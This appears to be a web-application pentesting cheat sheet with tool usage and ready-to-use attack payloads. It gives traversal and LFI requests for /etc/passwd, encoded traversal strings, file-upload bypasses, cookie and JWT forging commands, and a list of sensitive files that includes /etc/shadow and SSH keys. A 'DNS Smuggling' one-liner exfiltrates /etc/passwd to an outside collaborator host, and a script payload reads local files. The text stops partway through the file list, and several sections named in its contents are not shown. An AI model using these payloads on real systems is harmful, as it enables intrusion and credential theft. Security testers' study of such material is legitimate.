# Web Application Analysis

## Table of Contents

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Resources)
- [403 Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#403-Bypass)
- [Asset Discovery](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Asset-Discovery)
- [Burp Suite](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Burp-Suite)
- [Bypassing File Upload Restrictions](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Bypassing-File-Upload-Restrictions)
- [curl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#curl)
- [DirBuster](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#DirBuster)
- [Directory Traversal Attack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Directory-Traversal-Attack)
- [dirsearch](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#dirsearch)
- [DNS Smuggling](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#DNS-Smuggling)
- [DS_Walk](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#DS_Walk)
- [Favicon](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#favicon)
- [feroxbuster](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#feroxbuster)
- [ffuf](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#ffuf)
- [Flask-Unsign](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Flask-Unsign)
- [GitTools](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#GitTools)
- [GIXY](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#GIXY)
- [Gobuster](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Gobuster)
- [Hakrawler](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Hakrawler)
- [Host Header Regex Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Host-Header-Regex-Bypass)
- [HTML Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#HTML-Injection)
- [JWT_Tool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#JWT_Tool)
- [Kyubi](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Kyubi)
- [Local File Inclusion (LFI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Local-File-Inclusion-LFI)
- [Lodash](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Lodash)
- [Log Poisoning](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Log-Poisoning)
- [mitmproxy](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#mitmproxy)
- [ngrok](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#ngrok)
- [PadBuster](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#PadBuster)
- [PDF PHP Inclusion](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#PDF-PHP-Inclusion)
- [PHP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#PHP)
- [Poison Null Byte](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Poison-Null-Byte)
- [Remote File Inclusion (RFI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Remote-File-Inclusion)
- [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Request-Forgery)
- [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Template-Injection)
- [Upload Vulnerabilities](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Upload-Vulnerabilities)
- [Web Log Poisoning](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Web-Log-Poisoning)
- [Wfuzz](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Wfuzz)
- [WhatWeb](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#WhatWeb)
- [Wordpress](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Wordpress)
- [WPScan](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#WPScan)
- [XML External Entity (XXE)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#XML-External-Entity-XXE)
- [XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#XSRFProbe-Cross-Site-Request-Forgery--CSRF--XSRF)
- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Cross-Site-Scripting-XSS)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Arjun | HTTP Parameter Discovery Suite | https://github.com/s0md3v/Arjun |
| cariddi | Take a list of domains, crawl urls and scan for endpoints, secrets, api keys, file extensions, tokens and more. | https://github.com/edoardottt/cariddi |
| Hakrawler | Fast golang web crawler for gathering URLs and JavaScript file locations. | https://github.com/hakluke/hakrawler |
| httpx | httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads. | https://github.com/projectdiscovery/httpx |
| ngrok | ngrok is the programmable network edge that adds connectivity, security, and observability to your apps with no code changes. | https://ngrok.com |
| pingb | HTTP Request & Response Service | http://pingb.in |
| httpbin | A simple HTTP Request & Response Service. | https://httpbin.org/#/ |
| interact.sh | HTTP Request & Response Service | https://app.interactsh.com/#/ |
| Request Catcher | Request Catcher will create a subdomain on which you can test an application. | https://requestcatcher.com |
| Webhook.site | Webhook.site lets you easily inspect, test and automate (with the visual Custom Actions builder, or WebhookScript) any incoming HTTP request or e-mail. | https://webhook.site |
| grayhatwarfare shorteners | Search Shortener Urls | https://shorteners.grayhatwarfare.com |
| Gobuster | Gobuster is a tool used to brute-force URIs, DNS subdomains, Virtual Host names and open Amazon S3 buckets | https://github.com/OJ/gobuster |
| feroxbuster | A simple, fast, recursive content discovery tool written in Rust. | https://github.com/epi052/feroxbuster |
| ffuf | A fast web fuzzer written in Go. | https://github.com/ffuf/ffuf |
| Wfuzz | Wfuzz - The Web Fuzzer | https://github.com/xmendez/wfuzz |
| CipherScan | Cipherscan tests the ordering of the SSL/TLS ciphers on a given target, for all major versions of SSL and TLS. | https://github.com/mozilla/cipherscan |
| DS_Walk | Python tool for enumerating directories and files on web servers that contain a publicly readable .ds_store file. | https://github.com/Keramas/DS_Walk |
| GitDorker | GitDorker is a tool that utilizes the GitHub Search API and an extensive list of GitHub dorks that I've compiled from various sources to provide an overview of sensitive information stored on github given a search query. | https://github.com/obheda12/GitDorker |
| truffleHog | Find leaked credentials. | https://github.com/trufflesecurity/truffleHog |
| GitTools | This repository contains three small python/bash scripts used for the Git research. | https://github.com/internetwache/GitTools |
| EarlyBird | EarlyBird is a sensitive data detection tool capable of scanning source code repositories for clear text password violations, PII, outdated cryptography methods, key files and more. | https://github.com/americanexpress/earlybird |
| DumpsterDiver | DumpsterDiver is a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords. | https://github.com/securing/DumpsterDiver |
| reNgine | The only web application recon tool you will ever need! | https://github.com/yogeshojha/rengine |
| WPScan | WordPress Security Scanner | https://github.com/wpscanteam/wpscan |
| WhatWeb | Next generation web scanner | https://github.com/urbanadventurer/WhatWeb |
| katana | A next-generation crawling and spidering framework. | https://github.com/projectdiscovery/katana |
| NtHiM | Super Fast Sub-domain Takeover Detection | https://github.com/TheBinitGhimire/NtHiM |
| ipsourcebypass | This Python script can be used to bypass IP source restrictions using HTTP headers. | https://github.com/p0dalirius/ipsourcebypass |
| JSON Web Tokens | JSON Web Token Debugger | https://jwt.io |
| JWT_Tool | The JSON Web Token Toolkit v2 | https://github.com/ticarpi/jwt_tool |
| Commix | Commix (short for [comm]and [i]njection e[x]ploiter) is an open source penetration testing tool. | https://github.com/commixproject/commix |
| x8 | Hidden parameters discovery suite written in Rust. | https://github.com/Sh1Yo/x8 |
| Recox | The script aims to help in classifying vulnerabilities in web applications. | https://github.com/samhaxr/recox |
| ezXSS | ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting. | https://github.com/ssl/ezXSS |
| DalFox | DalFox is an powerful open source XSS scanning tool and parameter analyzer and utility that fast the process of detecting and verify XSS flaws. | https://github.com/hahwul/dalfox |
| Oralyzer | Oralyzer, a simple python script that probes for Open Redirection vulnerability in a website. | https://github.com/r0075h3ll/Oralyzer |
| XSRFProbe | The Prime Cross Site Request Forgery Audit & Exploitation Toolkit. | https://github.com/0xInfection/XSRFProbe |
| SSRFmap | SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. | https://github.com/swisskyrepo/SSRFmap |
| Leaky Paths | A collection of special paths linked to major web CVEs, known misconfigurations, juicy APIs ..etc. It could be used as a part of web content discovery, to scan passively for high-quality endpoints and quick-wins. | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | A list of useful payloads and bypasses for Web Application Security. | https://github.com/swisskyrepo/PayloadsAllTheThings |
| DOMXSS Wiki | The DOMXSS Wiki is a Knowledge Base for defining sources of attacker controlled inputs and sinks which potentially could introduce DOM Based XSS issues. | https://github.com/wisec/domxsswiki/wiki |
| Client-Side Prototype Pollution | In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to document.location parsing and useful script gadgets that can be used to demonstrate the impact. | https://github.com/BlackFan/client-side-prototype-pollution |
| AllThingsSSRF | This is a collection of writeups, cheatsheets, videos, related to SSRF in one single location. | https://github.com/jdonsec/AllThingsSSRF |
| SSRF testing resources | SSRF (Server Side Request Forgery) testing resources | https://github.com/cujanovic/SSRF-Testing |
| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
| Weird Proxies | It's a cheat sheet about behaviour of various reverse proxies and related attacks. | https://github.com/GrrrDog/weird_proxies |
| Awesome API Security | A collection of awesome API Security tools and resources. | https://github.com/arainho/awesome-api-security |
| KeyHacks | KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid. | https://github.com/streaak/keyhacks |
| Lodash | The Lodash library exported as a UMD module. | https://github.com/lodash/lodash |
| PHPGGC | PHPGGC: PHP Generic Gadget Chains | https://github.com/ambionics/phpggc |

## 403 Bypass

### HTTP Header Payload

```c
$ curl -I http://<RHOST> -H "X-Client-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-CLIENT-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
```

## Asset Discovery

```c
$ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
```

## Burp Suite

> https://portswigger.net/burp

```c
Ctrl+r          # Sending request to repeater
Ctrl+i          # Sending request to intruder
Ctrl+Shift+b    # base64 encoding
Ctrl+Shift+u    # URL decoding
```

### Filter for SSRF (AutoRepeater)

```c
((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})
```

## Bypassing File Upload Restrictions

* file.php -> file.jpg
* file.php -> file.php.jpg
* file.asp -> file.asp;.jpg
* file.gif (contains php code, but starts with string GIF/GIF98)
* 00%
* file.jpg with php backdoor in exif (see below)
* .jpg -> proxy intercept -> rename to .php

## curl

### Uploading Files through Upload Forms

#### POST File

```c
$ curl -X POST -F "file=@/PATH/TO/FILE/<FILE>.php" http://<RHOST>/<FILE>.php --cookie "cookie"
```

#### POST Binary Data to Web Form

```c
$ curl -F "field=<file.zip" http://<RHOST>/<FILE>.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

## DirBuster

> https://github.com/KajanM/DirBuster

```c
-r    // don't search recursively
-w    // scan with big wordlists

$ dirb http://<RHOST>
```

## Directory Traversal Attack

### Skeleton Payload Request

```c
GET /../../../../../../../../etc/passwd HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1
```

### Read /etc/passwd

```c
GET // HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1GET /../../../../../../../../etc/passwd HTTP/1.1
```

## dirsearch

> https://github.com/maurosoria/dirsearch

```c
-i    // includes specific status codes
-e    // excludes specific status codes

$ ./dirsearch.py -u http://<RHOST>:<RPORT> -e *
$ python3 dirsearch.py -u http://<RHOST>:<RPORT>/ -R 5 -e http,php,html,css /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt
```

## DNS Smuggling

```c
GETID=$(cat /etc/passwd | head -n 1 | base64) && nslookup $GETID.0wdj2957gw6t7g5463t7063hy.burpcollborator.net
```

## DS_Walk

> https://github.com/Keramas/DS_Walk

```c
$ python ds_walk.py -u http://<RHOST>
```

## Favicon

> https://wiki.owasp.org/index.php/OWASP_favicon_database

```c
$ curl https://<RHOST>/sites/favicon/images/favicon.ico | md5sum
```

## feroxbuster

> https://github.com/epi052/feroxbuster

```c
$ feroxbuster -u http://<RHOST> -x js,bak,txt,png,jpg,jpeg,php,aspx,html --extract-links
```

## ffuf

> https://github.com/ffuf/ffuf

```c
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
$ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

### API Fuzzing

```c
$ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

### Looging for LFI

```c
$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

### Fuzzing with PHP Session ID

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

### Testing

> http://fuff.me

#### Basic

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ
```

#### Recursion

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ -recursion
```

#### File Extensions

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/ext/logs/FUZZ -e .log
```

#### No 404 Header

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/no404/FUZZ -fs 669
```

#### Param Mining

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/param/data?FUZZ=1
```

#### Rate Limiting

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429
```

#### IDOR Testing

```c
$ seq 1 1000 | ffuf -w - -u http://ffuf.me/cd/pipes/user?id=FUZZ
```

#### Script for IDOR Testing

```c
#!/bin/bash

while read i
do
  if [ "$1" == "md5" ]; then
    echo -n $i | md5sum | awk '{ print $1 }'
  elif [ "$1" == "b64" ]; then
    echo -n $i | base64
  else
    echo $i
  fi
done
```

#### Use Script above for Base64 decoding

```c
$ seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://ffuf.me/cd/pipes/user2?id=FUZZ
```

#### MD5 Discovery using the Script

```c
$ seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://ffuf.me/cd/pipes/user3?id=FUZZ
```

#### Virtual Host Discovery

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs 1495
```

#### Massive File Extension Discovery

```c
$ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<TARGET>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

## Flask-Unsign

> https://github.com/Paradoxis/Flask-Unsign

```c
$ pip3 install flask-unsign
```

### Decode Cookie

```c
$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

### Brute Force

```c
$ flask-unsign --unsign --cookie < cookie.txt
```

### Unsigning a Cookie

```c
$ flask-unsign --unsign --no-literal-eval --wordlist /PATH/TO/WORDLIST/<FILE>.txt --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZm9vYmFyIn0.Yq4QPw.0Hj2xCfDMJi7ksNfR4Oe9yN7nYQ
```

### Signing a Cookie

```c
$ flask-unsign --sign --legacy --secret '<PASSWORD>' --cookie "{'logged_in': True, 'username': '<USER>'}"
```

### Signing a UUID Cookie

```c
$ flask-unsign --sign --cookie "{'logged_in': True}" --secret '<PASSWORD>'
$ flask-unsign --sign --cookie "{'cart_items': ["2" , "5" , "6"], 'uuid': 'e9e62997-0291-4f63-8dbe-10d035326c75' }" --secret '<SECRET_KEY>'
```

## GitTools

> https://github.com/internetwache/GitTools

### gitdumper

```c
$ ./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
```

### extractor

```c
$ ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

## GIXY

> https://github.com/yandex/gixy

```c
$ pip install gixy
$ gixy /etc/nginx/nginx.conf
```

## Gobuster

> https://github.com/OJ/gobuster

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

### Common File Extensions

```c
txt,bak,php,html,js,asp,aspx
```

### Common Picture Extensions

```c
png,jpg,jpeg,gif,bmp
```

### POST Requests

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

### DNS Recon

```c
$ gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### VHost Discovery

```c
$ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### Specifiy User Agent

```c
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

## Hakrawler

> https://github.com/hakluke/hakrawler

```c
$ hakrawler -url <RHOST> -depth 3
$ hakrawler -url <RHOST> -depth 3 -plain
$ hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
```

## Host Header Regex Bypass

### Skeleton Payload Request

```c
POST /password-reset.php HTTP/1.1
Host: gymxcrossfit.htb/employees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://employees.crossfit.htb
DNT: 1
Connection: close
Referer: http://employees.crossfit.htb/password-reset.php
Upgrade-Insecure-Requests: 1

email=david.palmer%40crossfit.htb

...
Host: gymxcrossfit.htb/employees.crossfit.htb    # <--- Host Header getting set after the "/" so we can bypass the regex by adding this line
...
```

## HTML Injection

> https://hackerone.com/reports/724153

```c
Filename<b>testBOLD</b>
```

### Skeleton Payload

```c
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

## JWT_Tool

> https://github.com/ticarpi/jwt_tool

```c
$ python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":' `date -d "+7 days" +%s`} | base64 -w0).
$ python3 jwt_tool.py -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyOWVmOTYzOTMwYjA0NzYzZmU2YzMiLCJuYW1lIjoiZm9vYmFyIiwiZW1haWwiOiJmb29iYXJAc2VjcmV0LmNvbSIsImlhdCI6MTYzNTk1MDQxOX0.nhsLKCvNPBU8EoYVwDDpo8wGrL9VV62vrHVxfsBPCRk
```

## Kyubi

> https://github.com/shibli2700/Kyubi

```c
$ kyubi -v <URL>
```

## Local File Inclusion (LFI)

```c
$ http://<RHOST>/<FILE>.php?file=
$ http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```

### Until PHP 5.3

```c
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

### Root Cause Function

```c
get_file_contents
```

### Null Byte

```c
%00
0x00
```

#### Example

```c
http://<RHOST>/index.php?lang=/etc/passwd%00
```

### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```c
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```c
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
$ base64 -d <FILE>.php
```

### Read Process via Burp Suite

```c
GET /index.php?page=../../../../../../../proc/425/cmdline HTTP/1.1
```

### Read Process Allocations via Burp Suite

```c
GET /index.php?page=../../../../../../../proc/425/maps HTTP/1.1
```

### Parameters

```c
cat
dir
img
action
board
date
detail
file
files
download
path
folder
prefix
include
page
------------------------------------------------------------------inc
locate
show
doc
site
type
view
content
document
layout
mod
conf
```

### Django, Rails, or Node.js Web Application Header Values

```c
Accept: ../../../../.././../../.../../etc/passwd{{
Accept: ../../../../.././../../.../../etc/passwd{%0D
Accept: ../../../../.././../../.../../etc/passwd{%0A
Accept: ../../../../.././../../.../../etc/passwd{%00
Accept: ../../../../.././../../.../../etc/passwd{%0D{{
Accept: ../../../../.././../../.../../etc/passwd{%0A{{
Accept: ../../../../.././../../.../../etc/passwd{%00{{
```

### Linux Files

```c
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
